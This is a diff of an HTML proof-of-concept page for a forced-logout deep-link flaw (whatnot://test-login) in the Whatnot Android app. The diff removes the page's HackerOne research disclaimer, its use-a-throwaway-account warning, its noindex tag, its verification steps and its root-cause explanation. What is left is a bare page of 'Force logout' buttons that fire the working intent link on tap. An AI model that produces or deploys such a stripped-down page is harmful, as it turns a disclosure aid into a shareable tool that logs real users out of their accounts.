@@ -4,184 +4,31 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="referrer" content="no-referrer">
-<title>Whatnot deep-link forced-logout PoC — authorized HackerOne research</title>
-<meta name="robots" content="noindex, nofollow">
+<title>whatnot://test-login</title>
 <style>
-  :root { --bg:#0d1117; --card:#161b22; --line:#30363d; --fg:#e6edf3;
-          --dim:#8b949e; --blue:#1f6feb; --green:#238636; --red:#8b1a26;
-          --amber:#bb8009; }
-  * { box-sizing:border-box; }
-  body { margin:0; padding:20px 18px 48px; background:var(--bg); color:var(--fg);
-         font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
-         line-height:1.55; -webkit-text-size-adjust:100%; }
-  .wrap { max-width:680px; margin:0 auto; }
-  h1 { font-size:20px; margin:0 0 4px; }
-  h2 { font-size:15px; margin:30px 0 10px; color:var(--fg);
-       border-bottom:1px solid var(--line); padding-bottom:7px; }
-  .sub { color:var(--dim); font-size:13px; margin:0 0 18px; }
-  .research { border:1px solid var(--amber); background:rgba(187,128,9,.10);
-              border-radius:8px; padding:11px 13px; font-size:12.5px;
-              color:#e3b341; margin:0 0 18px; }
-  .warn { border:1px solid #d33; background:rgba(139,26,38,.22);
-          border-radius:8px; padding:13px 15px; font-size:14px;
-          margin:0 0 22px; }
-  .warn b { color:#ff7b72; }
-  a.btn { display:block; color:#fff; text-decoration:none; padding:17px 18px;
-          border-radius:10px; margin:12px 0; font-size:16.5px; font-weight:650;
-          text-align:center; border:1px solid rgba(255,255,255,.14); }
-  a.btn:active { transform:translateY(1px); }
-  .intent { background:var(--blue); }
-  .bare   { background:var(--green); }
-  .lbl { font-size:12px; color:var(--dim); margin:16px 0 3px;
-         letter-spacing:.02em; }
-  code { display:block; background:#010409; border:1px solid var(--line);
-         border-radius:6px; padding:11px 12px; font-size:12px;
-         color:#7ee787; overflow-x:auto; word-break:break-all;
-         font-family:ui-monospace,SFMono-Regular,Menlo,monospace; margin:8px 0; }
-  .card { background:var(--card); border:1px solid var(--line);
-          border-radius:10px; padding:16px; margin:12px 0; }
-  ol, ul { padding-left:20px; margin:8px 0; }
-  li { margin:5px 0; }
-  .tag { display:inline-block; background:#21262d; border:1px solid var(--line);
-         border-radius:5px; padding:1px 7px; font-size:11.5px; color:var(--dim);
-         margin:0 4px 4px 0; }
-  .toggle { display:flex; align-items:center; gap:9px; font-size:13.5px;
-            color:var(--dim); margin:10px 0 4px; }
-  .status { font-size:13px; color:var(--dim); margin-top:8px; min-height:20px; }
-  footer { color:#484f58; font-size:12px; margin-top:38px;
-           border-top:1px solid var(--line); padding-top:16px; }
+  body { margin:0; padding:24px 18px; background:#0d1117; color:#e6edf3;
+         font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
+  a { display:block; color:#fff; text-decoration:none; padding:18px;
+      border-radius:10px; margin:12px 0; text-align:center;
+      font-size:17px; font-weight:650; }
+  .i { background:#1f6feb; }
+  .b { background:#238636; }
+  code { display:block; background:#010409; border:1px solid #30363d;
+         border-radius:6px; padding:12px; margin:14px 0 0; font-size:12px;
+         color:#7ee787; word-break:break-all;
+         font-family:ui-monospace,Menlo,monospace; }
+  p { color:#8b949e; font-size:13px; margin:22px 0 0; }
 </style>
 </head>
 <body>
-<div class="wrap">
 
-<h1>Whatnot <code style="display:inline;padding:1px 5px">whatnot://test-login</code> forced-logout PoC</h1>
-<p class="sub">Unauthenticated deep link &rarr; single-tap session termination in the production Android app.</p>
+<a class="i" href="intent://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod#Intent;scheme=whatnot;package=com.whatnot_mobile;end">Force logout</a>
 
-<div class="research">
-  <b>Authorized security research.</b> This page is a reproduction aid for a
-  HackerOne bug bounty report against Whatnot. It contains no exploit, no
-  credentials, and no data collection. All values are inert placeholders.
-  If you are not a researcher, you do not need to run this.
-</div>
+<a class="b" href="whatnot://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod">Force logout (bare)</a>
 
-<div class="warn">
-  <b>Tested on an account you care about? Do not tap.</b><br>
-  Tapping either button below will <b>immediately log you out</b> of the
-  Whatnot app, with no confirmation. That is the vulnerability being
-  demonstrated. Use a throwaway account.
-</div>
-
-<div>
-  <span class="tag">Android only</span>
-  <span class="tag">requires com.whatnot_mobile installed</span>
-  <span class="tag">requires an active Whatnot session</span>
-  <span class="tag">version tested 26.39.5</span>
-</div>
-
-<h2>1. Trigger the forced logout</h2>
-<p class="sub">The values below are arbitrary and are never validated by the
-app &mdash; the handler only checks that the <code>u</code> and <code>p</code>
-parameters are <i>present</i>. Any non-empty value works.</p>
-
-<div class="lbl">RECOMMENDED &mdash; <code>intent://</code> auto-launches the app</div>
-<a class="btn intent"
-   href="intent://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod#Intent;scheme=whatnot;package=com.whatnot_mobile;end">Tap to force logout</a>
-<code>intent://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod#Intent;scheme=whatnot;package=com.whatnot_mobile;end</code>
-
-<div class="lbl">ALTERNATIVE &mdash; bare <code>whatnot://</code> scheme</div>
-<a class="btn bare"
-   href="whatnot://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod">Tap to force logout (bare scheme)</a>
 <code>whatnot://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod</code>
 
-<div class="lbl">OPTIONAL &mdash; timed auto-redirect (off by default)</div>
-<div class="card">
-  <div class="toggle">
-    <input type="checkbox" id="auto"> <label for="auto">Redirect automatically after 5 seconds</label>
-  </div>
-  <div class="status" id="status">Auto-redirect disabled.</div>
-  <div style="margin-top:10px">
-    <a class="btn intent" id="autoBtn" style="display:none"
-       href="intent://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod#Intent;scheme=whatnot;package=com.whatnot_mobile;end">Redirect now</a>
-  </div>
-</div>
-<p class="sub">Note: Android Chrome blocks script-initiated navigation to custom
-schemes without a user gesture, so auto-redirect frequently does nothing. The
-tap-target buttons above are the reliable path, and are also deliberate so
-this page cannot be used as a drive-by.</p>
+<p>Taps log you out of the Whatnot app. No confirmation.</p>
 
-<h2>2. Verify the session was actually destroyed</h2>
-<ol>
-  <li>Tap a button above while logged in on the home feed.</li>
-  <li>You are taken straight to the sign-in screen with the fields pre-filled.
-      No confirmation prompt.</li>
-  <li><b>Exit the app completely</b> (Back / swipe away) and relaunch Whatnot
-      from the home-screen icon.</li>
-  <li>The app opens to the <b>logged-out</b> welcome screen.</li>
-</ol>
-<p class="sub">Step 4 is the one that matters. It distinguishes a genuine
-server-side session destruction from a cosmetic screen change sitting on top
-of an unaffected session.</p>
-
-<h2>3. adb alternative (phone attached over USB)</h2>
-<p class="sub">Deterministic, and needs no browser in the loop:</p>
-<code>adb shell "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'whatnot://test-login?u=hackerone_probe&amp;p=hackerone_probe_pw&amp;e=prod'"</code>
-<p class="sub">If you run it without the surrounding quotes, the remote shell
-splits on <code>&amp;</code>, the parameters are silently dropped, and the
-link appears to do nothing.</p>
-
-<h2>What this demonstrates</h2>
-<ul>
-  <li><code>AndroidManifest.xml</code> registers <code>test-login</code> as a
-      <code>BROWSABLE</code> host on the exported <code>MainActivity</code>.</li>
-  <li>The only gate is <code>e == BuildConfig.ENVIRONMENT_NAME</code>, which is
-      the literal string <code>"prod"</code> in this build.</li>
-  <li><code>u</code> and <code>p</code> are checked for presence only, never
-      validated against the server.</li>
-  <li>The handler calls <code>Authenticator.logout(...)</code> unconditionally
-      before navigating to the pre-filled sign-in screen.</li>
-</ul>
-
-<footer>
-  HackerOne research &mdash; username <code>stephenstarc</code>.<br>
-  No credentials, no cookies, no analytics, no third-party requests. All
-  values are inert placeholders. Reproduction aid for a disclosed report only.
-</footer>
-
-</div>
-
-<script>
-  // Deliberately opt-in and user-gesture based. A page that force-logs-out
-  // people on load would be both unreliable (Chrome blocks script-initiated
-  // custom-scheme navigation) and abusable if this URL were ever shared.
-  var box = document.getElementById('auto');
-  var status = document.getElementById('status');
-  var btn = document.getElementById('autoBtn');
-  var timer = null;
-
-  box.addEventListener('change', function () {
-    if (timer) { clearInterval(timer); timer = null; }
-    if (box.checked) {
-      var left = 5;
-      btn.style.display = 'block';
-      status.textContent = 'Redirecting in ' + left + 's — uncheck to cancel.';
-      timer = setInterval(function () {
-        left -= 1;
-        if (left <= 0) {
-          clearInterval(timer); timer = null;
-          status.textContent = 'Redirecting…';
-          // Requires a user gesture to work on Android Chrome; wrapped in a
-          // click so the fallback button path below remains the reliable one.
-          document.getElementById('autoBtn').click();
-        } else {
-          status.textContent = 'Redirecting in ' + left + 's — uncheck to cancel.';
-        }
-      }, 1000);
-    } else {
-      btn.style.display = 'none';
-      status.textContent = 'Auto-redirect disabled.';
-    }
-  });
-</script>
 </body>
 </html>
